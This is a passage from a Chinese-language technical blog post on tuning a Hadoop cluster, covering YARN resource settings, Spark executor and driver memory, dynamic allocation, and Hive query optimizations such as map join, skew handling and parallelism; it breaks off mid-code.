id="1、环境配置介绍">1、环境配置介绍</h2><p>一般生产环境NN和RM吃资源少的会单独配置，而工作节点会单独配置资源较多，例如Master节点配置为16核CPU、64G内存；Workder节点配置为32核CPU、128G内存，五台服务器如下所示</p><table><thead><tr><th>hadoop100</th><th>hadoop101</th><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>master</td><td>master</td><td>worker</td><td>worker</td><td>worker</td></tr><tr><td>NameNode</td><td>NameNode</td><td>DataNode</td><td>DataNode</td><td>DataNode</td></tr><tr><td>ResourceManager</td><td>ResourceManager</td><td>NodeManager</td><td>NodeManager</td><td>NodeManager</td></tr><tr><td></td><td></td><td>JournalNode</td><td>JournalNode</td><td>JournalNode</td></tr><tr><td></td><td></td><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td></tr><tr><td></td><td></td><td>Kafka</td><td>Kafka</td><td>Kafka</td></tr><tr><td>Hiveserver2</td><td>Metastore</td><td>hive-client</td><td>hive-client</td><td>hive-client</td></tr><tr><td>Spark</td><td></td><td>Spark</td><td>Spark</td><td>Spark</td></tr><tr><td>DS-master</td><td>DS-master</td><td>DS-worker</td><td>DS-worker</td><td>DS-worder</td></tr><tr><td>Maxwell</td><td></td><td></td><td></td><td></td></tr><tr><td>mysql</td><td></td><td></td><td></td><td></td></tr><tr><td>flume</td><td>flume</td><td></td><td></td><td></td></tr></tbody></table><h2 id="2、Yarn配置">2、Yarn配置</h2><h3 id="2-1-Yarn配置说明">2.1 Yarn配置说明</h3><p>需要调整的Yarn参数均与CPU、内存等资源有关，核心配置参数如下</p><ul><li><strong>yarn.nodemanager.resource.memory-mb</strong></li></ul><p>一个NodeManager节点分配给Container使用的内存。该参数的配置，取决于NodeManager所在节点的总内存容量和该节点运行的其他服务的数量。考虑上述因素，此处可将该参数设置为64G</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>65536<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>yarn.nodemanager.resource.cpu-vcores</strong></li></ul><p>一个NodeManager节点分配给Container使用的CPU核数。该参数的配置，同样取决于NodeManager所在节点的总CPU核数和该节点运行的其他服务。考虑上述因素，此处可将该参数设置为16</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.cpu-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>yarn.scheduler.maximum-allocation-mb</strong></li></ul><p>该参数的含义是，单个Container能够使用的最大内存。由于Spark的yarn模式下，Driver和Executor都运行在Container中，故该参数不能小于Driver和Executor的内存配置，推荐配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>16384<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>yarn.scheduler.minimum-allocation-mb</strong></li></ul><p>该参数的含义是，单个Container能够使用的最小内存，推荐配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>512<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-Yarn配置实操">2.2 Yarn配置实操</h3><p>修改<code>$HADOOP_HOME/etc/hadoop/yarn-site.xml</code>文件，修改如下参数，然后分发重启yarn（注意，对于单台的话，想修改哪台资源就动对应的机器）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>65536<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.cpu-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16384<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>512<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3、Spark配置">3、Spark配置</h2><h3 id="3-1-Executor配置说明">3.1 Executor配置说明</h3><ul><li><strong>Executor CPU核数配置</strong></li></ul><p>单个Executor的CPU核数，由spark.executor.cores参数决定，建议配置为4-6，具体配置为多少，视具体情况而定，原则是尽量充分利用资源</p><p>此处单个节点共有16个核可供Executor使用，则spark.executor.core配置为4最合适。原因是，若配置为5，则单个节点只能启动3个Executor，会剩余1个核未使用；若配置为6，则只能启动2个Executor，会剩余4个核未使用</p><ul><li><strong>Executor内存配置</strong></li></ul><p>Spark在Yarn模式下的Executor内存模型如下图所示</p><p><img src="http://qnypic.shawncoding.top/blog/202404151821642.png" alt></p><p>Executor相关的参数有：<code>spark.executor.memory</code>和<code>spark.executor.memoryOverhead</code>。<code>spark.executor.memory</code>用于指定Executor进程的堆内存大小，这部分内存用于任务的计算和存储；<code>spark.executor.memoryOverhead</code>用于指定Executor进程的堆外内存，这部分内存用于JVM的额外开销，操作系统开销等。两者的和才算一个Executor进程所需的总内存大小。<strong>默认情况下spark.executor.memoryOverhead的值等于spark.executor.memory*0.1</strong>。</p><p>以上两个参数的推荐配置思路是，先按照单个NodeManager的核数和单个Executor的核数，计算出每个NodeManager最多能运行多少个Executor。在将NodeManager的总内存平均分配给每个Executor，最后再将单个Executor的内存按照大约10:1的比例分配到<code>spark.executor.memory</code>和<code>spark.executor.memoryOverhead</code>。根据上述思路，可得到如下关系：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (spark.executor.memory+spark.executor.memoryOverhead)= </span></span><br><span class="line"><span class="comment"># yarn.nodemanager.resource.memory-mb * (spark.executor.cores/yarn.nodemanager.resource.cpu-vcores)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 经计算，此处应做如下配置：</span></span><br><span class="line">spark.executor.memory    14G</span><br><span class="line">spark.executor.memoryOverhead    2G</span><br></pre></td></tr></table></figure><h3 id="3-2-Executor个数配置">3.2 Executor个数配置</h3><p>此处的Executor个数是指分配给一个Spark应用的Executor个数，Executor个数对于Spark应用的执行速度有很大的影响，所以Executor个数的确定十分重要。一个Spark应用的Executor个数的指定方式有两种，<strong>静态分配</strong>和<strong>动态分配</strong></p><ul><li><strong>静态分配</strong></li></ul><p>可通过<code>spark.executor.instances</code>指定一个Spark应用启动的Executor个数。这种方式需要自行估计每个Spark应用所需的资源，并为每个应用单独配置Executor个数。</p><ul><li><strong>动态分配</strong></li></ul><p>动态分配可根据一个Spark应用的工作负载，动态的调整其所占用的资源（Executor个数）。这意味着一个Spark应用程序可以在运行的过程中，需要时，申请更多的资源（启动更多的Executor），不用时，便将其释放。<strong>在生产集群中，推荐使用动态分配</strong>。动态分配相关参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动动态分配</span></span><br><span class="line">spark.dynamicAllocation.enabled    <span class="literal">true</span></span><br><span class="line"><span class="comment">#启用Spark shuffle服务</span></span><br><span class="line">spark.shuffle.service.enabled    <span class="literal">true</span></span><br><span class="line"><span class="comment">#Executor个数初始值</span></span><br><span class="line">spark.dynamicAllocation.initialExecutors    1</span><br><span class="line"><span class="comment">#Executor个数最小值</span></span><br><span class="line">spark.dynamicAllocation.minExecutors    1</span><br><span class="line"><span class="comment">#Executor个数最大值</span></span><br><span class="line">spark.dynamicAllocation.maxExecutors    12</span><br><span class="line"><span class="comment">#Executor空闲时长，若某Executor空闲时间超过此值，则会被关闭</span></span><br><span class="line">spark.dynamicAllocation.executorIdleTimeout    60s</span><br><span class="line"><span class="comment">#积压任务等待时长，若有Task等待时间超过此值，则申请启动新的Executor</span></span><br><span class="line">spark.dynamicAllocation.schedulerBacklogTimeout 1s</span><br><span class="line"><span class="comment">#spark shuffle老版本协议</span></span><br><span class="line">spark.shuffle.useOldFetchProtocol <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>说明</strong>：Spark shuffle服务的作用是管理Executor中的各Task的输出文件，主要是shuffle过程map端的输出文件。由于启用资源动态分配后，Spark会在一个应用未结束前，将已经完成任务，处于空闲状态的Executor关闭。Executor关闭后，其输出的文件，也就无法供其他Executor使用了。需要启用Spark shuffle服务，来管理各Executor输出的文件，这样就能关闭空闲的Executor，而不影响后续的计算任务了</p><h3 id="3-3-Driver配置说明">3.3 Driver配置说明</h3><p>Driver主要配置内存即可，相关的参数有<code>spark.driver.memory</code>和<code>spark.driver.memoryOverhead</code>。<code>spark.driver.memory</code>用于指定Driver进程的堆内存大小，<code>spark.driver.memoryOverhead</code>用于指定Driver进程的堆外内存大小。默认情况下，两者的关系如下：<code>spark.driver.memoryOverhead=spark.driver.memory*0.1</code>。两者的和才算一个Driver进程所需的总内存大小。</p><p>一般情况下，按照如下经验进行调整即可：假定<code>yarn.nodemanager.resource.memory-mb</code>设置为X，<strong>若X&gt;50G，则Driver可设置为12G，若12G&lt;X&lt;50G，则Driver可设置为4G。若1G&lt;X&lt;12G，则Driver可设置为1G</strong>。 此处<code>yarn.nodemanager.resource.memory-mb</code>为64G，则Driver的总内存可分配12G，所以上述两个参数可配置为。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spark.driver.memory    10G</span><br><span class="line">spark.yarn.driver.memoryOverhead    2G</span><br></pre></td></tr></table></figure><h3 id="3-4-Spark配置实操">3.4 Spark配置实操</h3><p>修改<code>$HIVE_HOME/conf/spark-defaults.conf</code>，注意hive连哪台就修改哪台，也可以都分发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">spark.master                               yarn</span><br><span class="line">spark.eventLog.enabled                   <span class="literal">true</span></span><br><span class="line">spark.eventLog.dir    hdfs://myNameService1/spark-history</span><br><span class="line">spark.executor.cores    4</span><br><span class="line">spark.executor.memory    14g</span><br><span class="line">spark.executor.memoryOverhead    2g</span><br><span class="line">spark.driver.memory    10g</span><br><span class="line">spark.driver.memoryOverhead    2g</span><br><span class="line">spark.dynamicAllocation.enabled  <span class="literal">true</span></span><br><span class="line">spark.shuffle.service.enabled  <span class="literal">true</span></span><br><span class="line">spark.dynamicAllocation.executorIdleTimeout  60s</span><br><span class="line">spark.dynamicAllocation.initialExecutors    1</span><br><span class="line">spark.dynamicAllocation.minExecutors  1</span><br><span class="line">spark.dynamicAllocation.maxExecutors  12</span><br><span class="line">spark.dynamicAllocation.schedulerBacklogTimeout 1s</span><br><span class="line">spark.shuffle.useOldFetchProtocol    <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后配置Spark shuffle服务，Spark Shuffle服务的配置因Cluster Manager（standalone、Mesos、Yarn）的不同而不同。此处以Yarn作为Cluster Manager</p><ul><li>拷贝<code>$SPARK_HOME/yarn/spark-3.0.0-yarn-shuffle.jar</code>到<code>$HADOOP_HOME/share/hadoop/yarn/lib</code>；</li><li>分发<code>$HADOOP_HOME/share/hadoop/yarn/lib/yarn/spark-3.0.0-yarn-shuffle.jar</code></li><li>修改<code>$HADOOP_HOME/etc/hadoop/yarn-site.xml</code>文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle,spark_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services.spark_shuffle.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.spark.network.yarn.YarnShuffleService<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>分发<code>$HADOOP_HOME/etc/hadoop/yarn-site.xml</code>文件</li><li>重启Yarn</li></ul><h1>四、查询优化</h1><blockquote><p>具体的hive优化可以参考Hive文章中的企业级调优，这里仅当复习</p></blockquote><h2 id="1、Hive-SQL执行计划">1、Hive SQL执行计划</h2><blockquote><p>参考1：<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Explain" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Explain">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Explain</a><br>参考2：<a href="https://cwiki.apache.org/confluence/download/attachments/44302539/hos_explain.pdf?version=1&amp;modificationDate=1425575903211&amp;api=v2" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/download/attachments/44302539/hos_explain.pdf?version=1&amp;modificationDate=1425575903211&amp;api=v2">https://cwiki.apache.org/confluence/download/attachments/44302539/hos_explain.pdf?version=1&amp;modificationDate=1425575903211&amp;api=v2</a></p></blockquote><p>Hive SQL的执行计划，可由Explain查看。Explain呈现的执行计划，由一系列Stage组成，这个Stage具有依赖关系，每个Stage对应一个MapReduce Job或者Spark Job，或者一个文件系统操作等。每个Stage由一系列的Operator组成，一个Operator代表一个逻辑操作，例如TableScan Operator，Select Operator，Join Operator等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc formated xxx</span><br></pre></td></tr></table></figure><h2 id="2、分组聚合优化">2、分组聚合优化</h2><p>优化思路为<strong>map-side聚合</strong>。所谓map-side聚合，就是在map端维护一个hash table，利用其完成分区内的、部分的聚合，然后将部分聚合的结果，发送至reduce端，完成最终的聚合。map-side聚合能有效减少shuffle的数据量，提高分组聚合运算的效率。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用map-side聚合</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--hash map占用map端内存的最大比例</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.percentmemory=<span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用于检测源表是否适合map-side聚合的条数。</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.mapaggr.checkinterval=<span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--map-side聚合所用的HashTable，占用map任务堆内存的最大比例，若超出该值，则会对HashTable进行一次flush。</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.force.flush.memory.threshold=<span class="number">0.9</span>;</span><br></pre></td></tr></table></figure><h2 id="3、Join优化">3、Join优化</h2><h3 id="3-1-Hive-Join算法概述">3.1 Hive Join算法概述</h3><p>Hive拥有多种join算法，包括common join，map join，sort Merge Bucket Map Join等</p><ul><li><strong>common join</strong></li></ul><p>Map端负责读取参与join的表的数据，并按照关联字段进行分区，将其发送到Reduce端，Reduce端完成最终的关联操作</p><p><img src="http://qnypic.shawncoding.top/blog/202404151821643.png" alt></p><ul><li><strong>map join</strong></li></ul><p>若参与join的表中，有n-1张表足够小，Map端就会缓存小表全部数据，然后扫描另外一张大表，在Map端完成关联操作</p><p><img src="http://qnypic.shawncoding.top/blog/202404151821644.png" alt></p><ul><li><strong>Sort Merge Bucket Map Join</strong></li></ul><p>若参与join的表均为分桶表，且关联字段为分桶字段，且分桶字段是有序的，且大表的分桶数量是小表分桶数量的整数倍。此时，就可以以分桶为单位，为每个Map分配任务了，Map端就无需再缓存小表的全表数据了，而只需缓存其所需的分桶</p><h3 id="3-2-Map-Join优化">3.2 Map Join优化</h3><p>join的两表一大一小，可考虑map join优化</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启用map join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--common join转map join小表阈值</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size=<span class="number">1612000</span></span><br></pre></td></tr></table></figure><h3 id="3-3-Sort-Merge-Bucket-Map-Join">3.3 Sort Merge Bucket Map Join</h3><p>两张表都相对较大，可以考虑采用SMB Map Join对分桶大小是没有要求的。首先需要依据源表创建两个的有序的分桶表，dwd_trade_order_detail_inc建议分36个bucket，dim_user_zip建议分6个bucket,注意<strong>分桶个数</strong>的倍数关系以及<strong>分桶字段和排序字段</strong>。（创建的时候就要创建桶，一般应用场景比较小）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--启动Sort Merge Bucket Map Join优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.bucketmapjoin.sortedmerge=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--使用自动转换SMB Join</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.sortmerge.join=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h2 id="4、数据倾斜优化">4、数据倾斜优化</h2><h3 id="4-1-数据倾斜说明">4.1 数据倾斜说明</h3><p>数据倾斜问题，通常是指参与计算的数据分布不均，即某个key或者某些key的数据量远超其他key，导致在shuffle阶段，大量相同key的数据被发往一个Reduce，进而导致该Reduce所需的时间远超其他Reduce，成为整个任务的瓶颈。<strong>Hive中的数据倾斜常出现在分组聚合和join操作的场景中</strong></p><h3 id="4-2-分组聚合导致的数据倾斜">4.2 分组聚合导致的数据倾斜</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一种方案</span></span><br><span class="line"><span class="comment">--启用map-side聚合</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--hash map占用map端内存的最大比例</span></span><br><span class="line"><span class="keyword">set</span> hive.map.aggr.hash.percentmemory=<span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第二种方案</span></span><br><span class="line"><span class="comment">-- 启用skew groupby优化</span></span><br><span class="line"><span class="comment">-- 其原理是启动两个MR任务，第一个MR按照随机数分区，将数据分散发送到Reduce，完成部分聚合，第二个MR按照分组字段分区，完成最终聚合</span></span><br><span class="line"><span class="comment">--启用分组聚合数据倾斜优化</span></span><br><span class="line"><span class="keyword">set</span> hive.groupby.skewindata=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="4-3-join导致的数据倾斜">4.3 join导致的数据倾斜</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一种方案</span></span><br><span class="line"><span class="comment">--启用map join自动转换</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--common join转map join小表阈值</span></span><br><span class="line"><span class="keyword">set</span> hive.auto.convert.join.noconditionaltask.size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第二种方案</span></span><br><span class="line"><span class="comment">--启用skew join优化</span></span><br><span class="line"><span class="keyword">set</span> hive.optimize.skewjoin=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--触发skew join的阈值，若某个key的行数超过该参数值，则触发</span></span><br><span class="line"><span class="keyword">set</span> hive.skewjoin.key=<span class="number">100000</span>;</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404151821645.png" alt></p><h2 id="5、任务并行度优化">5、任务并行度优化</h2><h3 id="5-1-优化说明">5.1 优化说明</h3><p>对于一个分布式的计算任务而言，设置一个合适的并行度十分重要。在Hive中，无论其计算引擎是什么，所有的计算任务都可分为Map阶段和Reduce阶段。所以并行度的调整，也可从上述两个方面进行调整</p><h3 id="5-2-Map阶段并行度">5.2 Map阶段并行度</h3><p>ap端的并行度，也就是Map的个数。是由输入文件的切片数决定的。一般情况下，Map端的并行度无需手动调整。Map端的并行度相关参数如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--可将多个小文件切片，合并为一个切片，进而由一个map任务处理,默认开启的</span></span><br><span class="line"><span class="keyword">set</span> hive.input.format=org.apache.hadoop.hive.ql.io.CombineHiveInputFormat; </span><br><span class="line"><span class="comment">--一个切片的最大值</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.input.fileinputformat.split.maxsize=<span class="number">256000000</span>;</span><br></pre></td></tr></table></figure><h3 id="5-3-Reduce阶段并行度">5.3 Reduce阶段并行度</h3><p>Reduce端的并行度，相对来说，更需要关注。默认情况下，Hive会根据Reduce端输入数据的大小，估算一个Reduce并行度。但是在某些情况下，其估计值不一定是最合适的，故需要人为调整其并行度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--指定Reduce端并行度，默认值为-1，表示用户未指定</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces;</span><br><span class="line"><span class="comment">--Reduce端并行度最大值</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.max;</span><br><span class="line"><span class="comment">--单个Reduce Task计算的数据量，用于估算Reduce并行度</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.bytes.per.reducer;</span><br></pre></td></tr></table></figure><p>Reduce端并行度的确定逻辑为，若指定参数mapreduce.job.reduces的值为一个非负整数，则Reduce并行度为指定值。否则，Hive会自行估算Reduce并行度，估算逻辑如下：</p><p>假设Reduce端输入的数据量大小为totalInputBytes，参数<code>hive.exec.reducers.bytes.per.reducer</code>的值为bytesPerReducer，参数<code>hive.exec.reducers.max</code>的值为maxReducers，则Reduce端的并行度为：</p><p><img src="http://qnypic.shawncoding.top/blog/202404151821646.png" alt></p><p>其中，Reduce端输入的数据量大小，是从Reduce上游的Operator的Statistics（统计信息）中获取的。为保证Hive能获得准确的统计信息，需配置如下参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--执行DML语句时，收集表级别的统计信息，默认true</span></span><br><span class="line"><span class="keyword">set</span> hive.stats.autogather=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--执行DML语句时，收集字段级别的统计信息，默认true</span></span><br><span class="line"><span class="keyword">set</span> hive.stats.column.autogather=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--计算Reduce并行度时，从上游Operator统计信息获得输入数据量，默认true</span></span><br><span class="line"><span class="keyword">set</span> hive.spark.use.op.stats=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--计算Reduce并行度时，使用列级别的统计信息估算输入数据量，默认false</span></span><br><span class="line"><span class="keyword">set</span> hive.stats.fetch.column.stats=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h2 id="6、小文件合并优化">6、小文件合并优化</h2><p>小文件合并优化，分为两个方面，分别是Map端输入的小文件合并，和Reduce端输出的小文件合并</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--可将多个小文件切片，合并为一个切片，进而由一个map任务处理</span></span><br><span class="line"><span class="keyword">set</span> hive.input.format=org.apache.hadoop.hive.ql.io.CombineHiveInputFormat;</span><br><span class="line"><span class="comment">--开启合并Hive on Spark任务输出的小文件</span></span><br><span class="line"><span class="keyword">set</span> hive.merge.sparkfiles=<span 